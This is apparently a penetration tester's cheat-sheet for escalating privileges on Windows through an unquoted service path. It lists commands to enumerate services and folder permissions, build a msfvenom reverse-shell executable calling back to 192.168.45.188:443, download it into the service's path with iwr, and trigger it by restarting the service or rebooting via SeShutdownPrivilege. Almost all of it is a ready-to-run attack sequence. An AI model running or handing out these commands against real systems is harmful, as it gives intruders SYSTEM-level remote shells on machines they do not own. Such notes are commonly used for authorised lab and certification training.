# Finding services and permissions
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Example path
C:\Program Files\Enterprise Apps\Current Version\example-service.exe

# Check permissions
icacls "C:\Program Files\Enterprise Apps"
```
-----------------------

# Vulnerable service path exploitation
```bash
# Create payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=443 -f exe -o Current.exe

# Transfer payload
iwr -uri http://192.168.45.188/Current.exe -Outfile C:\Program Files\Enterprise Apps\Current.exe

# Starting the service
net stop example-service
net start example-service
Start-Service example-service
Stop-Service example-service
Restart-Service example-service

---

# If no permission to restart service but service is auto and we have shutdown privilege

# Check auto start
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'example-service'}

> example-serve Auto

# Set shutdown privilege
whoami /priv

> SeShutdownPrivilege 

# shutdown
shutdown /r /t 0
```
